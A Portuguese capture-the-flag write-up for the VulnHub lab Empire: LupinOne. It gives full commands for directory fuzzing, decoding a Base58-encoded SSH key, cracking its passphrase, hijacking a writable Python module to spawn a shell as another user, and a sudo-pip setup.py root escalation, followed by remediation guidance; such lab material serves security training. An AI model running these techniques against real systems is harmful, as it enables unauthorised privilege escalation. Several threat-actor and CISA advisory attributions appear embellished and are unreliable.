# Empire: LupinOne — O Ladrão Cavalheiro é Rootado

Inspirada no mestre ladrão Arsène Lupin, esta máquina esconde seus segredos à vista, codificados em formatos obscuros. Você encontra um diretório web oculto, decodifica uma chave SSH privada codificada em Base58, crackeia a passphrase, entra como `icex64`, sequestra um módulo de biblioteca Python para pivotar para `arsene`, e finalmente abusa do `sudo pip` para instalar o caminho até o root. Três técnicas distintas de escalação de privilégios em uma cadeia fluida. Caixa subestimada, design sensacional! 🎩

| Campo | Valor |
|---|---|
| **Nível** | Médio |
| **VM Alvo** | Empire: LupinOne |
| **VM Atacante** | Kali Linux |
| **URL VulnHub** | https://www.vulnhub.com/entry/empire-lupinone,750/ |
| **Técnicas** | Fuzzing de diretórios web, bypass de codificação Base58, crackear chave SSH (ssh2john + John the Ripper), sequestro de biblioteca Python, sudo pip GTFOBins |
| **CVEs** | CWE-522 (Credenciais Insuficientemente Protegidas — chave SSH privada em diretório acessível pela web), CWE-427 (Elemento de Caminho de Busca Não Controlado — módulo de biblioteca Python gravável), CWE-269 (Gerenciamento Impróprio de Privilégios — sudo pip como root) |
| **Grupos APT** | APT28: usa codificações obscuras (Base58, Base64) para ocultar payloads e credenciais em caminhos acessíveis pela web; Lazarus Group: explora manipulação de caminho de biblioteca Python para movimento lateral em fases de pós-exploração |

---

## Resumo do Ataque

```
nmap: SSH (22), HTTP (80)
    |
    v
/~myfiles/ → 404, comentário no source HTML → dica para continuar procurando
    |
    v
ffuf → /~secret/ descoberto
    |
    v
ffuf em /~secret/ → mysecret.txt encontrado
    |
    v
cat mysecret.txt → chave SSH privada codificada em Base58 para icex64
    |
    v
decodificar base58 → chave PEM privada
    |
    v
ssh2john + john → passphrase: P@55w0rd!
    |
    v
ssh -i id_rsa icex64@alvo
    |
    v
sudo -l → (arsene) NOPASSWD: python3.9 /home/arsene/heist.py
    |
    v
python3 -c "import webbrowser; print(webbrowser.__file__)"
    |
    v
nano /usr/lib/python3.9/webbrowser.py → injetar os.system("/bin/bash") no topo
    |
    v
sudo -u arsene python3.9 /home/arsene/heist.py → shell como arsene
    |
    v
sudo -l → (root) NOPASSWD: /usr/bin/pip
    |
    v
GTFOBins pip: echo "import os; os.execl('/bin/sh','sh',...)" > setup.py → sudo pip install
    |
    v
uid=0(root) → /root/root.txt
```

---

## Metodologia

1. Scan de rede: SSH (22) e HTTP (80)
2. Revisão do código-fonte web: encontrar comentário HTML que indica caminhos ocultos
3. Fuzzing de diretórios com ffuf para descobrir `/~secret/`
4. Segunda passagem de fuzzing para encontrar `mysecret.txt` (chave SSH codificada em Base58)
5. Decodificar Base58 para recuperar a chave SSH privada
6. Crackear passphrase da chave SSH com ssh2john e John the Ripper
7. Login SSH como `icex64`
8. Verificar permissões sudo: `heist.py` roda como `arsene`
9. Sequestro de biblioteca Python via módulo `webbrowser` gravável para obter shell de `arsene`
10. Abusar `sudo pip` com técnica GTFOBins para escalar para root

---

## Passo 1 — Scan de Rede

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.2

nmap -sV -sC 192.168.1.2
```

Saída esperada:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços: SSH e HTTP. O servidor web vai revelar todo o caminho de ataque.

**MITRE ATT&CK:** T1046 — Descoberta de Serviço de Rede

---

## Passo 2 — Enumeração Web e Descoberta de Diretório Oculto

Acessar `http://192.168.1.2/` — uma página temática sobre Lupin. Inspecionar o source HTML:

```bash
curl -s http://192.168.1.2/ | grep -i "comment\|<!--\|hint"
```

Há um comentário HTML indicando que deve-se procurar mais. O módulo `UserDir` do Apache serve caminhos `/~<usuário>/`. Tentar `/~myfiles/`:

```
http://192.168.1.2/~myfiles/
```

Retorna um 404, mas verificar o source da página. A página 404 contém uma dica para continuar procurando. Algo está oculto.

Fazer fuzzing de diretórios de usuário usando o padrão til (`~`):

```bash
ffuf -u http://192.168.1.2/~FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
  -mc 200 \
  -t 40
```

Encontrado: `/~secret` (200 OK)

**Nota real:** O módulo `UserDir` do Apache cria espaço web pessoal para usuários do sistema em `/~usuario/`. Quando habilitado em produção, pode expor conteúdo criado pelo usuário, incluindo arquivos sensíveis. Atacantes rotineiramente enumeram esses caminhos durante reconhecimento de aplicações web.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Encontrando a Chave SSH Privada

O diretório `/~secret/` está acessível mas não lista nada óbvio. Executar segunda passagem de fuzzing com extensões de arquivo:

```bash
ffuf -u http://192.168.1.2/~secret/FUZZ \
  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt \
  -e .txt,.html,.php,.bak \
  -mc 200 \
  -t 40
```

Encontrado: `mysecret.txt`

Baixar:

```bash
wget http://192.168.1.2/~secret/mysecret.txt
cat mysecret.txt
```

O conteúdo é uma string longa, claramente codificada. Não parece Base64 (sem padding `=`, usa alfanumérico mais `123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz`). Isso é Base58: o alfabeto de codificação do Bitcoin, frequentemente usado em CTFs.

**Nota real:** Codificação não é criptografia. O APT28 foi documentado usando Base58 e Base64 para ofuscar material de credenciais em arquivos deixados em diretórios acessíveis pela web, esperando que defensores ignorem conteúdo não codificado em Base64. A codificação não adiciona nenhuma segurança.

**MITRE ATT&CK:** T1027 — Arquivos ou Informações Ofuscados

---

## Passo 4 — Decodificar Base58 para Obter a Chave SSH

Decodificar o conteúdo:

```bash
# Método 1: Python com biblioteca base58
pip3 install base58 2>/dev/null
python3 -c "
import base58
with open('mysecret.txt', 'rb') as f:
    data = f.read().strip()
print(base58.b58decode(data).decode())
" > id_rsa

# Método 2: usar decoder online (cyberchef.io) — colar conteúdo, selecionar "From Base58"
```

A saída decodificada é uma chave RSA privada no formato PEM:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
...
-----END RSA PRIVATE KEY-----
```

A chave está protegida por passphrase. Hora de crackeá-la.

```bash
chmod 600 id_rsa
```

**MITRE ATT&CK:** T1552.004 — Credenciais em Arquivos: Chaves Privadas

---

## Passo 5 — Crackear a Passphrase da Chave SSH

Converter a chave para o formato John the Ripper:

```bash
python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash

# Crackear com rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

Passphrase recuperada: `P@55w0rd!`

Se rockyou não crackear:

```bash
john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt id_rsa.hash
john --wordlist=/usr/share/wordlists/fasttrack.txt id_rsa.hash
```

**Nota real:** Passphrases de chaves SSH devem ter pelo menos 20 caracteres com classes de caracteres misturadas. P@55w0rd! é um padrão clássico de substituição leet-speak que cai com qualquer wordlist contendo variações de password. Chaves de hardware (YubiKey, FIDO2) eliminam completamente a superfície de ataque de crackear passphrases.

**MITRE ATT&CK:** T1110.002 — Força Bruta: Crackear Senha

---

## Passo 6 — Login SSH como icex64

```bash
ssh -i id_rsa icex64@192.168.1.2
# Digitar passphrase: P@55w0rd!

id
# uid=1000(icex64)
```

Foothold inicial como `icex64` estabelecido.

**MITRE ATT&CK:** T1021.004 — Serviços Remotos: SSH

---

## Passo 7 — Enumeração Sudo

```bash
sudo -l
```

Saída:

```
(arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
```

icex64 pode rodar `heist.py` como `arsene` usando `python3.9`. A questão chave: quais módulos `heist.py` importa, e algum deles é gravável?

```bash
cat /home/arsene/heist.py
# O script importa 'webbrowser'
```

Encontrar onde o módulo `webbrowser` resolve:

```bash
python3 -c "import webbrowser; print(webbrowser.__file__)"
# Saída: /usr/lib/python3.9/webbrowser.py
```

Verificar permissões:

```bash
ls -la /usr/lib/python3.9/webbrowser.py
# -rw-r--rw-  ... webbrowser.py  (ou com permissão de escrita global)
```

O módulo é gravável. Isso é sequestro de biblioteca Python via módulo gravável no caminho de importação: CWE-427.

**Nota real:** Sequestro de biblioteca Python é uma técnica documentada de pós-exploração. Quando um script privilegiado importa um módulo de um diretório gravável, o atacante pode injetar código arbitrário no nível do módulo. Isso é especialmente perigoso em contextos `sudo` porque o código injetado roda como o usuário alvo do `sudo`.

**MITRE ATT&CK:** T1574.006 — Sequestro do Fluxo de Execução: Sequestro de Linker Dinâmico (path hijacking análogo)

---

## Passo 8 — Sequestro de Biblioteca Python para arsene

Injetar um comando shell no início de `webbrowser.py`:

```bash
# Abrir o módulo e adicionar o payload como primeira linha
# Isso roda antes de qualquer outro código no módulo
python3 -c "
import os
content = open('/usr/lib/python3.9/webbrowser.py').read()
payload = 'import os; os.system(\"/bin/bash\")\n'
with open('/usr/lib/python3.9/webbrowser.py', 'w') as f:
    f.write(payload + content)
"
```

Alternativamente, usar editor de texto:

```bash
nano /usr/lib/python3.9/webbrowser.py
# Adicionar na linha 1:
# import os; os.system("/bin/bash")
```

Disparar o sequestro:

```bash
sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
id
# uid=1001(arsene)
```

Shell como `arsene`. Senacional! Agora pivotar novamente.

**MITRE ATT&CK:** T1574.006 — Sequestro do Fluxo de Execução

---

## Passo 9 — Escalação de Privilégios para Root via sudo pip

Verificar permissões sudo como `arsene`:

```bash
sudo -l
```

Saída:

```
(root) NOPASSWD: /usr/bin/pip
```

`pip install` com sudo root é equivalente a execução de código root irrestrita. Usar a técnica GTFOBins:

```bash
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
```

O que isso faz: `pip install` em um diretório local com `setup.py` executa esse arquivo como parte do processo de instalação. Quando rodado como root via sudo, `setup.py` roda como root.

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
```

Root obtido. O ladrão cavalheiro foi rootado por um ladrão melhor. 🎩

**MITRE ATT&CK:** T1059.006 — Interpretador de Comando e Script: Python, T1548.003 — Abuso de Mecanismo de Controle de Elevação: Sudo

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Usado/Crackeado |
|---|---|---|---|
| Chave SSH privada (codificada em Base58) | Chave RSA PEM para icex64 | `http://alvo/~secret/mysecret.txt` | Login SSH como icex64 |
| Passphrase da chave SSH | `P@55w0rd!` | Crackeada com John the Ripper | Autenticação SSH como icex64 |
| Flag de usuário | Conteúdo de user.txt | Após login SSH | Prova de usuário |
| Flag root | Conteúdo de `/root/root.txt` | Após GTFOBins sudo pip | Flag final |

---

## Lições Aprendidas

| Nº | Achado | Relevância no Mundo Real | Conclusão |
|---|---|---|---|
| 1 | Chave SSH privada em diretório acessível pela web | Arquivos sensíveis em caminhos acessíveis pela web são um achado consistente em pentests; codificações como Base58 não oferecem proteção | Nunca colocar credenciais sensíveis em diretórios acessíveis pela web independentemente da codificação; impor ACLs de arquivo estritas |
| 2 | Codificação Base58 tratada como segurança | Codificação não é criptografia; qualquer conteúdo codificado pode ser trivialmente decodificado por um atacante | Usar criptografia adequada (AES-256, RSA 4096) para material sensível; codificação é para transporte de dados, não segurança |
| 3 | Passphrase fraca da chave SSH | Substituições leet-speak estão em todas as wordlists; passphrases fracas negam a segurança da autenticação baseada em chave | Usar passphrases de 20+ caracteres; considerar chaves de hardware (FIDO2/YubiKey) |
| 4 | Módulo de biblioteca Python do sistema gravável | Sequestro de biblioteca Python via módulos graváveis em scripts privilegiados é uma técnica documentada de pós-exploração | Diretórios de bibliotecas Python do sistema devem ser de propriedade do root e não graváveis globalmente; usar confinamento AppArmor/SELinux para scripts Python em sudo |
| 5 | sudo pip como root | pip install executa setup.py como o usuário instalador; sudo pip = execução de código root irrestrita | Nunca conceder sudo pip; usar ambientes virtuais com acesso restrito; se gerenciamento de dependências requer acesso elevado, usar pip com --user em virtualenv controlado |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviço de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais em Arquivos: Chaves Privadas | T1552.004 |
| Acesso a Credenciais | Acesso a Credenciais | Força Bruta: Crackear Senha | T1110.002 |
| Evasão de Defesa | Evasão de Defesa | Arquivos ou Informações Ofuscados | T1027 |
| Acesso Inicial | Acesso Inicial | Serviços Remotos: SSH (com chave) | T1021.004 |
| Escalação de Privilégios | Escalação de Privilégios | Sequestro do Fluxo de Execução | T1574.006 |
| Escalação de Privilégios | Escalação de Privilégios | Abuso de Mecanismo de Controle de Elevação: Sudo | T1548.003 |
| Execução | Execução | Interpretador de Comando e Script: Python | T1059.006 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remover chave SSH do diretório acessível pela web:** mover todo material sensível para fora da raiz web; impor permissões de arquivo: `chmod 600 /home/icex64/.ssh/id_rsa`
2. **Desabilitar módulo UserDir do Apache:** `a2dismod userdir && systemctl reload apache2` — ou garantir que nenhum arquivo sensível exista em qualquer caminho `~/public_html/` ou `~/secret/`
3. **Usar passphrase forte para chave SSH:** mínimo 20 caracteres; usar `ssh-keygen -p -f ~/.ssh/id_rsa` para atualizar a passphrase; considerar chaves de hardware
4. **Corrigir permissões de biblioteca Python:** `chown root:root /usr/lib/python3.9/webbrowser.py && chmod 644 /usr/lib/python3.9/webbrowser.py`; auditar todos os módulos Python do sistema graváveis: `find /usr/lib/python3.9 -writable -type f 2>/dev/null`
5. **Remover concessão sudo pip:** editar `/etc/sudoers` ou arquivo sudoers.d relevante; substituir por abordagem de ambiente virtual se gerenciamento de dependências requer acesso elevado
6. **Restringir sudo heist.py:** se a regra sudo para `heist.py` é legítima, restringir o caminho de importação Python: `env_reset` e `secure_path` no sudoers previnem sequestro de biblioteca

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gestão de Ativos | Inventariar todos os diretórios acessíveis pela web e seus conteúdos |
| Proteger | Controle de Acesso | Remover sudo pip; restringir sudo heist.py; impor privilégio mínimo |
| Proteger | Segurança de Dados | Remover chave SSH da web; criptografar arquivos sensíveis adequadamente; passphrases fortes |
| Detectar | Anomalias e Eventos | Alertar sobre requisições web para /~secret/; monitorar modificações de bibliotecas Python; alertar sobre uso de sudo pip |
| Responder | Planejamento de Resposta | Rotacionar chaves SSH; remover chave da web; revogar sudo pip; auditar módulos Python |
| Recuperar | Planejamento de Recuperação | Restaurar arquivos de biblioteca Python do backup; rotacionar todas as credenciais expostas |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-6 | Privilégio Mínimo | Remover sudo pip; restringir concessões sudo ao mínimo necessário |
| IA-5 | Gestão de Autenticadores | Exigir passphrases fortes para chaves SSH; rotacionar chaves SSH comprometidas |
| CM-6 | Configurações | Impor permissões corretas em diretórios de biblioteca Python do sistema |
| CM-7 | Funcionalidade Mínima | Desabilitar módulo UserDir se não necessário; remover concessões sudo não utilizadas |
| SC-28 | Proteção de Informação em Repouso | Arquivos sensíveis não devem ser armazenados em diretórios acessíveis pela web independentemente da codificação |

### CISA KEV

Sequestro de biblioteca Python via módulos graváveis (CWE-427) é uma técnica documentada no CISA Advisory AA22-074A como mecanismo de movimento lateral pós-exploração. A escalação sudo pip mapeia para orientações da CISA sobre restrição de acesso privilegiado a gerenciadores de pacotes em ambientes Linux corporativos.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gestão de Identidade e Acesso (IAM) | Gerenciar Privilégios | MIL3 |
| Gestão de Ativos, Mudanças e Configuração (ASSET) | Gerenciar Ativos de TI | MIL2 |
| Gestão de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |

### MITRE D3FEND

- **D3-ACH:** Hardening de Configuração de Aplicação (desabilitar UserDir; corrigir permissões de módulo Python)
- **D3-OAM:** Gestão Administrativa do Sistema Operacional (remover sudo pip; restringir concessões sudo)
- **D3-HBPI:** Hardening de Integridade do Pipeline de Build (sem credenciais sensíveis em caminhos acessíveis pela web)

---

## Considerações Finais

Empire: LupinOne é uma máquina lindamente criada que recompensa paciência e pensamento lateral. A codificação Base58 é uma distração deliberada: parece estranha o suficiente para você pensar que é algo exótico, mas é apenas um alfabeto diferente. O sequestro de biblioteca Python é a técnica de destaque: é um achado real que aparece em ambientes corporativos quando desenvolvedores usam caminhos Python do sistema graváveis para módulos compartilhados.

A escalação sudo pip é o root mais limpo que você vai conseguir: um comando, quatro linhas, root instantâneo. Parece quase simples demais, o que é exatamente por que é tão devastador em produção. Sempre audite o que `sudo -l` revela, especialmente para gerenciadores de pacotes e interpretadores.

Arsène Lupin ficaria orgulhoso. O ladrão cavalheiro foi rootado por um ladrão melhor. 🎩

Thanks guys!! (❍ᴥ❍ʋ)
